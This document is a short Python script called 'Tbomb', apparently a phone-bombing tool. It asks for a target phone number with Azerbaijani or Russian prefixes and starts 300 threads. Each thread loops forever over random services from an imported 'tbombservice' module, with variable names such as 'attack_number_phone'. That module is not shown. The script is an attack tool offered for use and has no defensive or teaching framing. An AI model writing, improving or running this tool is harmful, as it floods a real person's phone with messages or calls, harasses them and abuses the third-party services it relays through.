import sys, os, pyfiglet
from tbombservice import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("Tbomb"))

print('''
████████╗██████╗  ██████╗ ███╗   ███╗██████╗ 
╚══██╔══╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
   ██║   ██████╔╝██║   ██║██╔████╔██║██████╔╝
   ██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
   ██║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
   
   
''')


phone = input('Nomre (+994,+7): ')
print('============')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Nomreni sehv girdiniz ! tekrar girin (+99450xxxxxxx)')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
